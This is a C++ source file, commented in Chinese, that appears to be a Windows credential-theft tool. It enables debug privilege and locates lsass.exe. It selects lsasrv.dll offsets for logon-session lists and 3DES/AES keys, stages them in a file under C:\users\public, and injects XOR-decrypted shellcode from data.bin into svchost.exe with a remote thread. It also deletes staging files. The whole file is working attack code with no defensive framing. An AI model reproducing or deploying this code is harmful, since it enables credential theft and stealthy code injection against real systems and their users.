#include <Windows.h>
#include <tchar.h>
#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <userenv.h>
#include <iostream>
#define TABLE_LENGTH 1024
bool EnableDebugPrivilege()
{
	HANDLE tokenHandle;
	TOKEN_PRIVILEGES tokenPrivileges;
	LUID luid;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &tokenHandle))
	{
		std::cout << "Failed to open process token. Error: " << GetLastError() << std::endl;
		return false;
	}

	if (!LookupPrivilegeValue(nullptr, SE_DEBUG_NAME, &luid))
	{
		std::cout << "Failed to lookup privilege value. Error: " << GetLastError() << std::endl;
		CloseHandle(tokenHandle);
		return false;
	}

	tokenPrivileges.PrivilegeCount = 1;
	tokenPrivileges.Privileges[0].Luid = luid;
	tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	if (!AdjustTokenPrivileges(tokenHandle, FALSE, &tokenPrivileges, sizeof(TOKEN_PRIVILEGES), nullptr, nullptr))
	{
		std::cout << "Failed to adjust token privileges. Error: " << GetLastError() << std::endl;
		CloseHandle(tokenHandle);
		return false;
	}

	CloseHandle(tokenHandle);
	return true;
}
bool FBFileExists(const char* szPath) {
	DWORD dwAttrib = GetFileAttributesA(szPath);
	return (dwAttrib != INVALID_FILE_ATTRIBUTES &&
		!(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
}
#pragma comment(lib, "Version.lib")
char version_table[TABLE_LENGTH][50] = {
	"10.0.19041.1",
	"10.0.19041.2913"
};
DWORD offset_table[TABLE_LENGTH] = {
	0x32BC3,
	0x1FA63
};

DWORD _offset_table[TABLE_LENGTH][4] = {
	  {0x32BC3,0x39E5C,0x9E36E,0x108},
	  {0x1FA63,0x395DC,0x8CA6C,0x108}
};
void getosversion(char* result) {
	char buffer[1024] = { 0 };
	char PATH[1024] = "C:\\windows\\system32\\lsasrv.dll";
	GetFileVersionInfoA(PATH,
		NULL,
		1024,
		(LPVOID)buffer);
	//	printf("%s\n", buffer);
		// 这很简单，遍历这个buffer，直到找到FileVersion的unicode版本就行了
		// 字节序里,长度22
	int result_counter = 0;
	byte asdasdasdbyte[1024] = { 0x46,0x00,0x69,0x00,0x6c,0x00,0x65,0x00,0x56,0x00,0x65,0x00,0x72,0x00,0x73,0x00,0x69,0x00,0x6f,0x00,0x6e,0x00 };
	for (int i = 0; i < 1024; i++) {
		// 相等则说明已经遍历到了fileversion字符串了
		if (0 == memcmp(buffer + i, asdasdasdbyte, 22)) {
			// 往后偏移四个字节就是版本号了
			char* versionoffset = buffer + i + 22 + 4;
			// 这个版本号其实就是一个unicode字符串，往后遍历，一直遍历到两个0就行了
			byte terminator[1024] = { 0x0,0x0 };
			int first = 1;
			for (int gi = 0; gi < 1024; gi++) {
				if (0 == memcmp(versionoffset + gi, terminator, 2)) {
					// 遍历完成，返回就行了
					return;
				}
				if (*(versionoffset + gi) != 0) {
					char _1[2] = { 0 };
					sprintf_s(_1, "%s", versionoffset + gi);
					if (first == 1) {
						//strcpy_s(result,2, _1);
						memcpy_s(result + result_counter, 100, _1, 1);
						result_counter += 1;
						first = 0;
					}
					else {
						//strcat_s(result+1,2, _1);
						memcpy_s(result + result_counter, 100, _1, 1);
						result_counter += 1;
					}
				}
			}
		}
	}
}


int GetLsassPid() {
	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (Process32First(hSnapshot, &entry)) {
		while (Process32Next(hSnapshot, &entry)) {
			if (wcscmp(entry.szExeFile, L"lsass.exe") == 0) {
				return entry.th32ProcessID;
			}
		}
	}
	CloseHandle(hSnapshot);
	return 0;
}

int GetLsvchostsassPid() {
	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (Process32First(hSnapshot, &entry)) {
		while (Process32Next(hSnapshot, &entry)) {
			if (wcscmp(entry.szExeFile, L"svchost.exe") == 0) {
				return entry.th32ProcessID;
			}
		}
	}
	CloseHandle(hSnapshot);
	return 0;
}

int main(int argc, char** argv)
{
	if (FBFileExists("C:\\users\\public\\3iaad")) {
		DeleteFileA("C:\\users\\public\\3iaad");
	}
	if (FBFileExists("C:\\users\\public\\kiaad")) {
		DeleteFileA("C:\\users\\public\\kiaad");
	}
	if (FBFileExists("C:\\users\\public\\ili6ao")) {
		DeleteFileA("C:\\users\\public\\ili6ao");
	}
	if (FBFileExists("C:\\users\\public\\aiaad")) {
		DeleteFileA("C:\\users\\public\\aiaad");
	}


		
		
		
	EnableDebugPrivilege();
	DWORD pid = GetLsassPid();
	// 我需要先获取lsasrv.dll的版本信息，从而得到关键的3个符号的偏移量信息
	char* res = (char*)malloc(50);
	ZeroMemory(res, 50);
	getosversion(res);
	//printf("%s\n", res);
		// 遍历到第一个空格
	for (int i = 0; i < 1234; i++) {
		if (res[i] == ' ') {
			// 在这里断掉
			res[i] = '\0'; break;
		}
	}
	printf("[*] version: %s\n", res);
	DWORD offset = 0;
	for (int i = 0; i < TABLE_LENGTH; i++) {
		if (strcmp(res, version_table[i]) == 0) {
			offset = offset_table[i];
			// 记录下来这个索引，写入到文件中，供注入到svchost.exe进程中的shellcode去读取
			char write_out[123] = { 0 };
			sprintf_s(write_out,123, "%03d", i);
			sprintf_s(write_out+3,120, "%07d", pid);

			// 我们从_offset_table中根据上面获取到的index，写入四个偏移量
			// logonsessionlist、3des、aes、credential字段在logonsessionlist节点中的偏移
			// 我们写入的结构为  3bytes 索引 （现在已经没啥用了，只不过我懒得改）
			// 7字节lsass pid
			// 偏移量的长度不会超过8字节，我们将其格式化为0填充的8位16进制字符串
			// 8字节偏移量   4个一共占32字节

			sprintf_s(write_out + 3 + 7, 123, "%08x", _offset_table[i][0]);
			sprintf_s(write_out + 3 + 7 + 8, 123, "%08x", _offset_table[i][1]);
			sprintf_s(write_out + 3 + 7 + 8 + 8, 123, "%08x", _offset_table[i][2]);
			sprintf_s(write_out + 3 + 7 + 8 + 8 + 8, 123, "%08x", _offset_table[i][3]);



			FILE* fptr;
			if (FBFileExists("C:\\users\\public\\ili6ao"))DeleteFileA("C:\\users\\public\\ili6ao");
			// Open a file in writing mode
			fopen_s(&fptr, "C:\\users\\public\\ili6ao", "w");

			// Write some text to the file
			fprintf(fptr, write_out);

			// Close the file
			fclose(fptr);
			break;
		}
	}
	if (!offset) {
		printf("[-] unknown version, abort...\n");
		free(res);
		exit(-1);
	}
	free(res);
	// 将shellcode写入目标进程内存并启动shellcode

	// 获取第一个svchost进程的pid
	DWORD _svchost_1_pid = GetLsvchostsassPid();

	// 从文件中读取shellcode并解密
	const char* filePath = "data.bin"; // Replace with your file path

	// Open the file for reading
	HANDLE hFile = CreateFileA(
		filePath,                   // File path
		GENERIC_READ,               // Access mode (read)
		FILE_SHARE_READ,            // Share mode (allow others to read)
		NULL,                       // Security attributes (default)
		OPEN_EXISTING,              // Creation disposition (open only if it exists)
		FILE_ATTRIBUTE_NORMAL,      // File attributes (normal)
		NULL                        // Template file (not used)
	);

	if (hFile == INVALID_HANDLE_VALUE) {
		fprintf(stderr, "Error opening the file\n");
		return 1;
	}

	// Get the file size
	DWORD fileSize = GetFileSize(hFile, NULL);
	if (fileSize == INVALID_FILE_SIZE) {
		fprintf(stderr, "Error getting file size\n");
		CloseHandle(hFile);
		return 1;
	}

	// Allocate memory for the byte array
	BYTE* byteArray = (BYTE*)malloc(fileSize);
	if (byteArray == NULL) {
		fprintf(stderr, "Error allocating memory\n");
		CloseHandle(hFile);
		return 1;
	}

	// Read the binary data from the file into the byte array
	DWORD bytesRead;
	if (!ReadFile(hFile, byteArray, fileSize, &bytesRead, NULL)) {
		fprintf(stderr, "Error reading from the file\n");
		CloseHandle(hFile);
		free(byteArray);
		return 1;
	}

	// Close the file handle
	CloseHandle(hFile);
		
	// Now byteArray contains the binary data from the file

	printf("Successfully read %lu bytes from the file: %s\n", bytesRead, filePath);

	// Free the memory allocated for the byte array
	//free(byteArray);
	// 使用疑惑解密byteArray
	for (int i = 0; i < fileSize; i++) {
		byteArray[i] = byteArray[i] ^ 'p';
	}


	HANDLE hw = OpenProcess(PROCESS_ALL_ACCESS, 0, _svchost_1_pid);
	if (!hw)
	{
		printf("Process Not found (0x%lX)\n", GetLastError());
		return -1;
	}
	void* base = VirtualAllocEx(hw, NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!base)
	{
		CloseHandle(hw);
		return -1;
	}
	if (!WriteProcessMemory(hw, base, byteArray, fileSize, NULL))
	{
		printf("write process memory faild (0x%lX)\n", GetLastError());
		CloseHandle(hw);
		return -1;
	}
	HANDLE thread = CreateRemoteThread(hw, NULL, NULL, (LPTHREAD_START_ROUTINE)base, NULL, 0, 0);
	if (!thread)
	{
		printf("Failed to create thread (0x%lX)\n", GetLastError());
		CloseHandle(hw);
		CloseHandle(thread);
	}

	exit(-1);
}
